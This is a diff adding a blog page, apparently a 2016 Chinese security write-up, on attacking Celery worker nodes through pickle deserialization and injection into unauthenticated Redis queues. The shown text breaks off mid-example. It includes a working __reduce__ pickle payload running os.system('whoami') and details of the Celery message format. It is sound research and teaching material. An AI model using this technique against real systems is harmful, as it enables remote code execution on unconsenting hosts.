@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。 流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 __reduce__() 会在 pickle 库进行反序列化的时候进">
+<meta name="keywords" content="web,security,python,exploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞组合拳 - 攻击分布式节点">
+<meta property="og:url" content="http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。 流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 __reduce__() 会在 pickle 库进行反序列化的时候进">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/1.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-09-22-attacking-distributed-nodes-by-message-queue-injection/2.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/3.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/4.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/5.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/6.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/7.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/8.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/9.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/10.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/11.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/12.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/13.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/14.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/15.gif">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/16.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/17.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/18.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/19.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/20.png">
+<meta property="og:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/21.png">
+<meta property="og:updated_time" content="2016-09-21T16:00:00.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="漏洞组合拳 - 攻击分布式节点">
+<meta name="twitter:description" content="分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。 流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 __reduce__() 会在 pickle 库进行反序列化的时候进">
+<meta name="twitter:image" content="http://rickgray.me/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>漏洞组合拳 - 攻击分布式节点</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&text=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&is_video=false&description=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=漏洞组合拳 - 攻击分布式节点&body=Check out this article: http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&name=漏洞组合拳 - 攻击分布式节点&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、老生常谈-Python-序列化"><span class="toc-number">1.</span> <span class="toc-text">一、老生常谈 Python 序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-简单的序列化例子"><span class="toc-number">1.1.</span> <span class="toc-text">1. 简单的序列化例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Trick-使得反序列化变得危险"><span class="toc-number">1.2.</span> <span class="toc-text">2. Trick 使得反序列化变得危险</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、分布式框架-Celery"><span class="toc-number">2.</span> <span class="toc-text">二、分布式框架 Celery</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-使用框架进行简单的任务下发"><span class="toc-number">2.1.</span> <span class="toc-text">1. 使用框架进行简单的任务下发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-框架中的消息封装方式"><span class="toc-number">2.2.</span> <span class="toc-text">2. 框架中的消息封装方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-构造恶意消息数据"><span class="toc-number">2.3.</span> <span class="toc-text">3. 构造恶意消息数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、利用脆弱的-Broker-代理进行分布式节点攻击"><span class="toc-number">3.</span> <span class="toc-text">三、利用脆弱的 Broker 代理进行分布式节点攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-检测-Celery-应用中-Broker-特征"><span class="toc-number">4.</span> <span class="toc-text">1. 检测 Celery 应用中 Broker 特征</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-使用脚本进行消息注入攻击分布式节点"><span class="toc-number">4.1.</span> <span class="toc-text">2. 使用脚本进行消息注入攻击分布式节点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、互联网案例检测"><span class="toc-number">5.</span> <span class="toc-text">四、互联网案例检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接"><span class="toc-number">6.</span> <span class="toc-text">相关链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        漏洞组合拳 - 攻击分布式节点
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2016-09-21T16:00:00.000Z" itemprop="datePublished">2016-09-22</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/exploit/">exploit</a>, <a class="tag-link" href="/tags/python/">python</a>, <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>分布式系统大都需要依赖于<strong>消息队列中间件</strong>来解决异步处理、应用耦合等问题，<strong>消息队列中间件</strong>的选择又依赖于整体系统的设计和实现，消息的<strong>封装</strong>、<strong>传递</strong>、<strong>处理</strong>贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。</p>
+<p>流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 <code>__reduce__()</code> 会在 pickle 库进行反序列化的时候进行调用，PHP 中类的魔术方法 <code>__wakup()</code> 同样也会在实例进行反序列化的时候调用等等。</p>
+<p>从开发者角度看来，开发语言提供的数据序列化方式方便了实例对象进行跨应用传递，<strong>程序A</strong> 和 <strong>程序B</strong> 能够通过序列化数据传递方式来<strong>远程访问实例对象</strong>或者<strong>远程调用方法</strong>（如 Java 中的 RMI）；而站在安全研究者角度，这种跨应用的数据传递或者调用方式可能存在对象数据篡改和方法恶意调用的安全隐患。</p>
+<p>在消息队列的实现中，消息数据的序列化（封装）方式就成了一颗定时炸弹，不安全的序列化方式可能会导致消息数据被篡改，从而引发反序列化（数据解析）后的一些列安全问题。</p>
+<p>消息队列中间件的选择也是一大问题，常见的有 RabbitMQ，ActiveMQ，Kafka，Redis 等，而像 Redis 这种存在未授权访问问题的组件如果被攻击者所控制，即可通过组件直接向消息队列中插入数据，轻则影响整个分布式节点的逻辑处理，重则直接插入恶意数据结合反序列化等问题对节点群进行攻击。</p>
+<p>说了这么多，总结一下上面提到的几个安全问题：</p>
+<ol>
+<li>各语言中存在的序列化问题可直接导致远程命令执行；</li>
+<li>消息队列的实现常常会直接使用语言自身的序列化（或相似的）方式封装消息；</li>
+<li>分布式系统使用的消息队列中间件种类繁多，其中某些分布式框架使用了像 Redis 这种存在着<strong>未授权访问</strong>问题的组件；</li>
+<li>消息队列中消息的篡改会直接或间接影响到分布式节点；</li>
+</ol>
+<p>将这 4 个安全问题或者说是漏洞结合在一起，即可成为一种可直接入侵和破坏分布式节点的攻击方法。那么，是否存在真正满足上述问题的实例呢？目前，已经发现了 Python 中 Celery 分布式框架确实存在这样的问题，下面我会针对上诉 4 个问题以 Celery 分布式框架为例来说明如何攻击分布式节点打出漏洞组合拳。</p>
+<h3 id="一、老生常谈-Python-序列化"><a href="#一、老生常谈-Python-序列化" class="headerlink" title="一、老生常谈 Python 序列化"></a>一、老生常谈 Python 序列化</h3><p>Celery 分布式框架是由 Python 语言所编写的，为了下面更好的说明问题，所以这里首先简单的回顾一下 Python 序列化的安全问题。</p>
+<h4 id="1-简单的序列化例子"><a href="#1-简单的序列化例子" class="headerlink" title="1. 简单的序列化例子"></a>1. 简单的序列化例子</h4><p>Python 中有这么一个名为 <code>pickle</code> 的模块用于实例对象的序列化和反序列化，一个简单的例子：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObj</span><span class="params">(object)</span>:</span></span><br><span class="line">    loa = <span class="string">'hello my object'</span></span><br><span class="line">    </span><br><span class="line">t_obj = MyObj()</span><br><span class="line">serialized = base64.b64encode(pickle.dumps(t_obj))</span><br><span class="line">print(<span class="string">'--&gt; pickling MyObj instance &#123;&#125; and Base64 it\ngot "&#123;&#125;"'</span>.format(t_obj, serialized))</span><br><span class="line">print(<span class="string">'--&gt; unpickling serialized data\nwith "&#123;&#125;"'</span>.format(serialized))</span><br><span class="line">obj = pickle.loads(base64.b64decode(serialized))</span><br><span class="line">print(<span class="string">'** unpickled object is &#123;&#125;'</span>.format(obj))</span><br><span class="line">print(<span class="string">'&#123;&#125; -&gt; loa = &#123;&#125;'</span>.format(obj, obj.loa))</span><br></pre></td></tr></table></figure>
+<p>因 <code>pickle</code> 模块对实例对象进行序列化时产生的是二进制结构数据，传输的时候常常会将其进行 Base64 编码，这样可以有效地防止字节数据丢失。上面的程序作用是将一个 <code>MyObj</code> 类实例进行序列化并进行 Base64 编码然后进行解码反序列化重新得到实例的一个过程，运行程序后得到输出：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/1.png" alt=""></p>
+<p>通过截图可以看到序列化前和序列化后的实例是不同的（对象地址不同），并且通常反序列化时实例化一个类实例，当前的运行环境首先必须定义了该类型才能正常序列化，否则可能会遇到找不到正确类型无法进行反序列化的情况，例如将上诉过程分文两个文件 <code>serializer.py</code> 和 <code>unserializer.py</code>，前一个文件用于实例化 <code>MyObj</code> 类并将其序列化然后经 Base64 编码输出，而后一个文件用于接收一串字符串，将其 Base64 解码后进行反序列化：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># serializer.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObj</span><span class="params">(object)</span>:</span></span><br><span class="line">    loa = <span class="string">'hello my object'</span></span><br><span class="line">print(base64.b64encode(pickle.dumps(MyObj())))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># unserializer.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">print(pickle.loads(base64.b64decode(sys.argv[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure>
+<p>就上面所说，在反序列化时如果环境中不存在反序列化类型的定义，因为 <code>unserializer.py</code> 中未定义 <code>MyObj</code> 类，则在对 <code>serializer.py</code> 输出结果进行反序列化时会失败报错，提示找不到 <code>MyObj</code>：</p>
+<p><img src="/images/articles/2016-09-22-attacking-distributed-nodes-by-message-queue-injection/2.png" alt=""></p>
+<h4 id="2-Trick-使得反序列化变得危险"><a href="#2-Trick-使得反序列化变得危险" class="headerlink" title="2. Trick 使得反序列化变得危险"></a>2. Trick 使得反序列化变得危险</h4><p>看似反序列化并不能实例化任意对象（运行环境依赖），但有那么些 tricks 可以达到进行反序列化即可任意代码执行的效果。</p>
+<p>如果一个类定义了 <code>__reduce__()</code> 函数，那么在对其实例进行反序列化的时候，<code>pickle</code> 会通过 <code>__reduce__()</code> 函数去寻找正确的重新类实例化过程。（<code>__reduce__()</code> 函数<a href="https://docs.python.org/2/library/pickle.html#object.__reduce__" target="_blank" rel="noopener">详细文档参考</a>）</p>
+<p>例如这里我在 <code>MyObj</code> 类中定义 <code>__reduce__()</code> 函数：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObj</span><span class="params">(object)</span>:</span></span><br><span class="line">    loa = <span class="string">'hello my object'</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (str, (<span class="string">'replaced by __reduce__() method'</span>, ))</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>然后再执行上一节的程序过程，会直接得到输出：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/3.png" alt=""></p>
+<p>这里不再报错是因为，<code>MyObj</code> 在进行序列化的时候，将重新构建类的过程写进了序列化数据里，<code>pickle</code> 在进行反序列化的时候会遵循重建过程去执行相应操作，这里是使用内置的 <code>str</code> 函数去操作参数 <code>&#39;replaced by __reduce__() method&#39;</code> 并返回，所以成功反序列化并输出的字符串。</p>
+<p>有了 <code>__reduce__()</code> 这个函数，就可以利用该特性在反序列化的时候直接执行任意代码了，如下示例代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># evil.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CMD</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'whoami'</span>, ))</span><br><span class="line">print(base64.b64encode(pickle.dumps(CMD())))</span><br></pre></td></tr></table></figure>
+<p>运行得到编码后的序列化数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==</span><br></pre></td></tr></table></figure>
+<p>这里需要主要的是 <code>os.system(&#39;whoami&#39;)</code> 这个过程不是在序列化过程执行的，而是将这个过程以结构化的数据存于了序列化数据中，这里可以看一下二进制序列化数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  demo echo -n &quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==&quot; | base64 -D | xxd</span><br><span class="line">0000000: 6370 6f73 6978 0a73 7973 7465 6d0a 7030  cposix.system.p0</span><br><span class="line">0000010: 0a28 5327 7768 6f61 6d69 270a 7031 0a74  .(S&apos;whoami&apos;.p1.t</span><br><span class="line">0000020: 7032 0a52 7033 0a2e                      p2.Rp3..</span><br><span class="line">➜  demo</span><br></pre></td></tr></table></figure>
+<p>数据都是以 Python <code>pickle</code> 序列化数据结构进行整合的，具体底层协议实现可参考官方文档。</p>
+<p>对上面的序列化数据使用 <code>unserializer.py</code> 进行反序列化操作时，会触发类重构操作，从而执行 <code>os.system(&#39;whoami&#39;)</code>：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/4.png" alt=""></p>
+<p>历史上框架或者应用由于 Python 反序列化问题导致的任意命令执行并不少见，如 Django 低版本使用了 <code>pickle</code> 作为 Session 数据默认的序列化方式，在设置了使用 Cookie 进行 Session 数据存储的时候，会使得攻击者直接构造恶意 Cookie 值，触发恶意的反序列化进行任意命令执行；又一些程序可接受一串序列化数据作为输入，如 SQLMAP 之前的 <code>--pickled-options</code> 运行参数就可以传入由 <code>pickle</code> 模块序列化后的数据。虽然官方有对 <code>pickle</code> 模块进行安全声明，指明了不要反序列化未受信任的数据来源，但是现实应用逻辑繁杂，常会有这样的数据可控的点出现，也是不太好避免的。</p>
+<h3 id="二、分布式框架-Celery"><a href="#二、分布式框架-Celery" class="headerlink" title="二、分布式框架 Celery"></a>二、分布式框架 Celery</h3><p>回顾完 Python 序列化的问题，这时候转过来看一下 Celery 这个分布式框架。</p>
+<h4 id="1-使用框架进行简单的任务下发"><a href="#1-使用框架进行简单的任务下发" class="headerlink" title="1. 使用框架进行简单的任务下发"></a>1. 使用框架进行简单的任务下发</h4><p>Celery 借助消息队列中间件进行消息（任务）的传递，一个简单利用 Celery 框架进行任务下发并执行的例子：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_simple.py</span></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line">app = Celery(<span class="string">'demo'</span>, broker=<span class="string">'amqp://192.168.99.100//'</span>, backend=<span class="string">'amqp://192.168.99.100//'</span>)</span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure>
+<p>Celery 推荐使用 RabbitMQ 作为 Broker，这里直接在 <code>192.168.99.100</code> 主机上开启 RabbitMQ 服务，然后在终端使用 celery 命令起一个 worker：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">celery worker -A celery_simple.app -l DEBUG</span><br></pre></td></tr></table></figure>
+<p>然后另起一个 ipython 导入 <code>celery_simple</code> 模块中的 <code>add()</code> 函数，对其进行调用并获取结果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: from celery_simple import add</span><br><span class="line">In [2]: task = add.apply_async((4, 5))</span><br><span class="line">In [3]: task.result</span><br><span class="line">Out[3]: 9</span><br></pre></td></tr></table></figure>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/5.png" alt=""></p>
+<h4 id="2-框架中的消息封装方式"><a href="#2-框架中的消息封装方式" class="headerlink" title="2. 框架中的消息封装方式"></a>2. 框架中的消息封装方式</h4><p>本文并不关心框架的具体实现和用法，只关心消息的具体封装方式。在 Celery 框架中有多种可选的消息序列化方式：</p>
+<ul>
+<li><strong>pickle</strong></li>
+<li>json</li>
+<li>msgpack</li>
+<li>yaml</li>
+<li>…</li>
+</ul>
+<p>可以看到 Celery 框架所使用的消息序列化方式中含有 pickle 的序列化方式，上一部分已经说明了 Python 中 pickle 序列化方式存在的安全隐患，而 Celery 框架却支持这种方式对消息进行封装，并且在 4.0.0 版本以前默认使用的也是 pickle 序列化方式。</p>
+<p>为了弄明白 Celery 的消息格式，这里将 Broker 换成 Redis 方便直接查看数据。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_simple.py</span></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line">app = Celery(<span class="string">'demo'</span>, broker=<span class="string">'redis://:@192.168.99.100:6379/0'</span>, backend=<span class="string">'redis://:@192.168.99.100:6379/0'</span>)</span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure>
+<p>这里先不起 worker 进程，直接使用 ipython 进行任务下发：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: from celery_simple import add</span><br><span class="line">In [2]: task = add.apply_async((4, 9))</span><br></pre></td></tr></table></figure>
+<p>这时候查看 Redis 里面的数据：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/6.png" alt=""></p>
+<p>可以看到 Redis 里面存在两个键，<code>celery</code> 和 <code>_kombu.binding.celery</code>，这里解释一下具体两个键的具体含义。在 Celery 中消息可以根据路由设置分发到不同的任务上，例如这里 <code>add()</code> 函数由于没有进行特别的设置，所以其所处的消息队列为名为 <code>celery</code> 的队列，<code>exchange</code> 和 <code>routing_key</code> 值都为 <code>celery</code>，所有满足路由（<code>{&quot;queue&quot;:&quot;celery&quot;,&quot;exchange&quot;:&quot;celery&quot;,&quot;routing_key&quot;:&quot;celery&quot;}</code>）的消息都会发到该 worker 上，然后 worker 根据具体的调用请求去寻找注册的函数使用参数进行调用。 </p>
+<p>而刚刚提到的 Reids 中的键 <code>_kombu.binding.celery</code> 表示存在一个名为 <code>celery</code> 的队列，其 <code>exchange</code> 和 <code>routing_key</code> 的信息保存在该集合里：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/7.png" alt=""></p>
+<p>而键 <code>celery</code> 里面存储的就是每一个 push 到队列里面的具体消息信息：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/8.png" alt=""></p>
+<p>可以看到是一个 JSON 格式的数据，为了更方便的进行字段分析，将其提出来格式化显示为：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"body"</span>: <span class="string">"gAJ9cQAoWAMAAAB1dGNxAYhYAgAAAGlkcQJYJAAAADFkOGZhN2FlLTEyZjYtNDIyOS05ZWI5LTk5ZDViYmI5ZGFiZXEDWAUAAABjaG9yZHEETlgGAAAAa3dhcmdzcQV9cQZYBAAAAHRhc2txB1gRAAAAY2VsZXJ5X3NpbXBsZS5hZGRxCFgIAAAAZXJyYmFja3NxCU5YAwAAAGV0YXEKTlgJAAAAY2FsbGJhY2tzcQtOWAQAAABhcmdzcQxLBEsJhnENWAcAAAB0YXNrc2V0cQ5OWAcAAABleHBpcmVzcQ9OWAkAAAB0aW1lbGltaXRxEE5OhnERWAcAAAByZXRyaWVzcRJLAHUu"</span>,</span><br><span class="line">    <span class="attr">"headers"</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">"content-encoding"</span>: <span class="string">"binary"</span>,</span><br><span class="line">    <span class="attr">"content-type"</span>: <span class="string">"application/x-python-serialize"</span>,</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"body_encoding"</span>: <span class="string">"base64"</span>,</span><br><span class="line">        <span class="attr">"reply_to"</span>: <span class="string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span>,</span><br><span class="line">        <span class="attr">"correlation_id"</span>: <span class="string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span>,</span><br><span class="line">        <span class="attr">"delivery_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"routing_key"</span>: <span class="string">"celery"</span>,</span><br><span class="line">            <span class="attr">"exchange"</span>: <span class="string">"celery"</span>,</span><br><span class="line">            <span class="attr">"priority"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"delivery_mode"</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">"delivery_tag"</span>: <span 